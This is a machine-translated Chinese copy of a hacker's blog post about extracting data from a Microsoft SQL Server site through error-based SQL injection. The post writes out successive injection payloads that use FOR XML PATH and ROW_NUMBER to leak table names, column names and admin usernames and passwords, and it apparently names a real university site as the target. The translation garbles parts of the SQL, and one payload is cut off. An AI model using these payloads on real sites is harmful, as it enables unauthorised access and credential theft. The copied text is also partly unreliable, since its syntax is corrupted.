<html>
<head>
<title>SQL Injection Data Extraction through .NET framework error.</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">SQL注入数据提取通过。NET framework错误。</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/sql-injection-data-extraction-through-net-framework-error-ec9972858321?source=collection_archive---------0-----------------------#2019-03-17">https://infosecwriteups.com/sql-injection-data-extraction-through-net-framework-error-ec9972858321?source=collection_archive---------0-----------------------#2019-03-17</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="aee3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你好，我是Atmanand Nagpure(proghax333)。我是一名计算机研究员，也是一名黑客。这是一个关于我如何想出一种方法，通过产生。NET未处理的异常。这种技术适用于原始查询中有连接、联合或其他内容的地方。</p><p id="5018" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">问题:</strong> <br/>所以，我面临的问题是:我在一个网站上尝试基于联盟的注射，但是当我尝试风格的注射的<em class="kl">订单时，网站没有给我响应中适当的列数。它给出了连接查询组中第一个表的列数。因此，我试图找出另一种从查询中提取数据的方法。</em></p><p id="9a27" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有趣的是，从注入和无效输入中，我发现服务器技术是Microsoft SQL server。所以，决定搜寻一些战功。但是，它们不起作用。</p><p id="3a79" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">记住，我是在尝试提取数据。没有尝试执行插入查询或更新查询。</strong></p><p id="396b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，我在附加到原始查询的AND语句中尝试了非封闭字符串比较。这是它的样子:</p><p id="6923" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">网址:<a class="ae km" href="http://faculty.bamu.ac.in/Department/FacultyDetailViewN.aspx?Id=817%27%20and%201=%22%20--%20-+" rel="noopener ugc nofollow" target="_blank">http://www.example.com/Department/FacultyDetailViewN.aspx?Id= </a> 817 '和1 = "--+</p><figure class="ko kp kq kr gt ks gh gi paragraph-image"><div role="button" tabindex="0" class="kt ku di kv bf kw"><div class="gh gi kn"><img src="../Images/be948b39583f4921bfba79b615c8fa9c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*vU8ZsCNUqZQDjQqgKMaw-A.png"/></div></div><figcaption class="kz la gj gh gi lb lc bd b be z dk translated">比较1= "，其中"是非封闭字符串。产生了一些数据的异常。</figcaption></figure><p id="a449" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">好吧，现在我真的有动力了。我开始想，我们可以以某种方式提取结果错误中的数据。让错误出现。通过错误提取数据。</p><p id="a148" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">解决方案:</strong></p><p id="d8f0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，在牢记这一愿景后，我开始编写一个嵌套的SQL查询，并将其与整数1进行比较，如下所示:</p><p id="0582" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">？Id=817 '和1=(从information_schema.tables中选择table _ name</p><p id="4a76" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">它给了我这个…嗯…是的…但是，这不是真正的大问题…</p><figure class="ko kp kq kr gt ks gh gi paragraph-image"><div role="button" tabindex="0" class="kt ku di kv bf kw"><div class="gh gi ld"><img src="../Images/53be2d91d8a0d60518061151c7b1036b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oKAGhGcSn00EEN3C4hnKMg.png"/></div></div><figcaption class="kz la gj gh gi lb lc bd b be z dk translated">是的…这是行不通的，因为它返回多个值。不过，修好它没什么大不了的。</figcaption></figure><p id="c5d4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以，我决定只返回一行作为查询结果。出于测试目的，我使用了<em class="kl"> select top 1，</em>返回表格的第一行。所以，是的…我用了它，瞧！我从information_schema.tables中获得了第一个table_name！</p><p id="98ff" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">？Id=817 '和1=(从information_schema.tables中选择前1个表名)—+</p><figure class="ko kp kq kr gt ks gh gi paragraph-image"><div role="button" tabindex="0" class="kt ku di kv bf kw"><div class="gh gi le"><img src="../Images/f70974b8709746473c5078332408180c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*dFPpPGYRA1h6paH6OnZhag.png"/></div></div><figcaption class="kz la gj gh gi lb lc bd b be z dk translated">瞧啊。从information_schema表中获取了第一个table_name。</figcaption></figure><p id="83af" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，在解决了第一个问题之后，又出现了另一个与SQL Server语言语法相关的问题:MSSQL没有'<strong class="jp ir"> LIMIT m，n </strong> ' <strong class="jp ir"> </strong>语法！！！没有测距操作员！！！现在该怎么办？因为，比较只能发生在单值之间。</p><p id="8d1c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，我发现使用了一个很棒的SQL Server hack，它将所有行连接成一个XML。传说中的<em class="kl">FOR XML(')</em>hack！</p><p id="a1a5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">注意:</strong>DB _ NAME()函数返回MSSQL中当前数据库的名称。</p><p id="1378" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我是这样做的:<br/>？Id=817 '和1=(select cast(concat(db_name()，0x3a，0x3a，table_name，0x0a)as varchar(8000))from information _ schema . tables for XML path('))—+</p><figure class="ko kp kq kr gt ks gh gi paragraph-image"><div role="button" tabindex="0" class="kt ku di kv bf kw"><div class="gh gi lf"><img src="../Images/577be073b0f71e578ce1d68345676ce7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yEnoSWkmdfLPhxPoLZ1MFQ.png"/></div></div><figcaption class="kz la gj gh gi lb lc bd b be z dk translated">以下是数据库中的表格。</figcaption></figure><p id="8f89" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，下一步是获取Admin_login表的列。只是使用了通用的<em class="kl"> where </em>条件。</p><p id="eafc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">？Id=817 '和1=(select cast(concat(db_name()，0x3a，0x3a，column_name，0x0a)as varchar(8000))from information _ schema . columns其中table _ name = ' Admin _ log in ' for XML path('))—+</p><figure class="ko kp kq kr gt ks gh gi paragraph-image"><div role="button" tabindex="0" class="kt ku di kv bf kw"><div class="gh gi lg"><img src="../Images/051b2022cc9c58c087c135f20c7979f5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*j2aFaWf27N_bG76rC1iatA.png"/></div></div><figcaption class="kz la gj gh gi lb lc bd b be z dk translated">这是表中的列。现在，只需要提取数据。</figcaption></figure><p id="f85b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，一切都很简单。我唯一要做的就是对表执行一个简单的SQL Select查询:</p><p id="088b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">817 '和1 =(select cast(UId，0x3a，0x3a，Pwd，0x0a)as varchar(8000))from Admin _ log in for XML path(' ')—+</p><figure class="ko kp kq kr gt ks gh gi paragraph-image"><div class="gh gi lh"><img src="../Images/32622444eb436aeb2930366c585aaaf1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1142/format:webp/1*QzWRxkHbLJbbGY-Oisbd1g.png"/></div><figcaption class="kz la gj gh gi lb lc bd b be z dk translated">这就是Admin_login表中的用户名:密码</figcaption></figure><p id="9481" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">就是这样！那是我的第一次尝试！</p><p id="420c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">方法二(真的？啊？):</strong></p><p id="0077" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，这里有另一个查询，我使用一个简单的方法来逐行提取数据:ROW_NUMBER()函数。</p><p id="9821" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="kl"> 817 '和1=(SELECT concat(0x35，0x34，0x35，0x31，0x35，0x46，0x46，0x46，0x41，0x45，0x39，0x42，0x32，0x37，0x36，0x39，0x31，0x41，0x31，0x30，0x31，0x41，db_name()，0x3a，0x3a，table_name，0x37，0x41，0x46，</em></p><p id="6ff0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">哇哦。大查询…但是那个十六进制的东西只是用来提取数据的，使用一个定制的PHP脚本编写，用CURL API提取数据。我执行了GET请求。脚本检查数据库返回的数据。这是可能的，因为十六进制的东西只不过是一个由JavaScript RegEx搜索的唯一字符串。它提取该唯一字符串之间的子字符串。然后使用专门编写的JavaScript函数删除重复数据。</p><figure class="ko kp kq kr gt ks gh gi paragraph-image"><div role="button" tabindex="0" class="kt ku di kv bf kw"><div class="gh gi kn"><img src="../Images/15764a3136f91d43b9fee176559e2818.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tZ_uKddfKFQ56SlhXk0c1w.png"/></div></div><figcaption class="kz la gj gh gi lb lc bd b be z dk translated">自定义PHP脚本从网站检索数据，并以表格格式呈现。</figcaption></figure><p id="91b7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，开发人员必须采取最大的谨慎和预防措施来保证数据的安全，不要将接口和直接对象引用泄露给外人。将您的服务器升级到最新的Microsoft SQL Server 2017或更高版本。</p><p id="03ac" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">今天就到这里吧！</p><p id="7b73" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">问候，<br/><a class="ae km" href="https://medium.com/@skillzworldtech" rel="noopener">atman and nag pure</a>(Prog hax 333)。</p></div><div class="ab cl li lj hu lk" role="separator"><span class="ll bw bk lm ln lo"/><span class="ll bw bk lm ln lo"/><span class="ll bw bk lm ln"/></div><div class="ij ik il im in"><p id="70a9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="kl">关注</em> <a class="ae km" href="https://medium.com/bugbountywriteup" rel="noopener"> <em class="kl"> Infosec报道</em> </a> <em class="kl">获取更多此类精彩报道。</em></p><div class="lp lq gp gr lr ls"><a href="https://medium.com/bugbountywriteup" rel="noopener follow" target="_blank"><div class="lt ab fo"><div class="lu ab lv cl cj lw"><h2 class="bd ir gy z fp lx fr fs ly fu fw ip bi translated">信息安全报道</h2><div class="lz l"><h3 class="bd b gy z fp lx fr fs ly fu fw dk translated">收集了世界上最好的黑客的文章，主题从bug奖金和CTF到vulnhub…</h3></div><div class="ma l"><p class="bd b dl z fp lx fr fs ly fu fw dk translated">medium.com</p></div></div><div class="mb l"><div class="mc l md me mf mb mg kx ls"/></div></div></a></div></div></div>    
</body>
</html>